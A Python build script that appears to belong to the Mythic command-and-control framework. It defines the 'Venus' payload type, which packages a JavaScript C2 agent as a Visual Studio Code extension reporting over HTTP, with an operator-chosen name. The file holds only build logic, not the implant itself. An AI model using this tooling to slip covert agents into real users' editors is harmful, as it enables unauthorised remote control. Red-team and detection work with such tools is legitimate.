from PayloadBuilder import *
import asyncio
import os
from distutils.dir_util import copy_tree
import shutil
import tempfile

# Icons made by "https://www.flaticon.com/authors/freepik" "Freepik"

class Venus(PayloadType):

    name = "venus"
    file_extension = "zip"
    author = "@mattreduce"
    supported_os = [SupportedOS.Linux, SupportedOS.MacOS]
    wrapper = False
    wrapped_payloads = []
    note = "This payload uses JavaScript for execution in the context of Visual Studio Code via an Extension"
    supports_dynamic_loading = False
    build_parameters = {
        "name": BuildParameter(
            name="name",
            parameter_type=BuildParameterType.String,
            description="Name of your extension",
            default_value="example",
            required=False,
        )
    }

    c2_profiles = ["HTTP"]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)

        agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
        copy_tree(self.agent_code_path, agent_build_path.name)

        # [/] In "{}/extension.js".format(self.agent_code_path)
        # Replace REPLACE_PAYLOAD_UUID with value of `self.uuid`
        extension = open(
            "{}/extension.js".format(agent_build_path.name), "r"
        ).read()
        modified = extension.replace("REPLACE_PAYLOAD_UUID", self.uuid)
        extension = open(
            "{}/extension.js".format(agent_build_path.name), "w"
        ).write(modified)

        # [/] In "{}/package.json".format(self.agent_code_path)
        # Replace replace_extension_name
        manifest = open(
            "{}/package.json".format(agent_build_path.name), "r"
        ).read()
        modified2 = manifest.replace("replace_extension_name",
            self.get_parameter('name'))
        manifest = open(
            "{}/package.json".format(agent_build_path.name), "w"
        ).write(modified2)

        # Make a downloadable ZIP archive of modified extension source
        temp_uuid = str(uuid.uuid4())
        shutil.make_archive(
            "{}/{}".format(agent_build_path.name, temp_uuid),
            "zip",
            "{}".format(agent_build_path.name),
        )
        resp.payload = open(
            "{}/{}.zip".format(agent_build_path.name, temp_uuid), "rb"
        ).read()

        # resp.payload = open(
        #     "{}/widgets-0.0.1.vsix".format(self.agent_code_path), "rb"
        # ).read()

        resp.set_status(status=BuildStatus.Success)
        resp.message = "Created ZIP archive of VS Code extension files"

        return resp
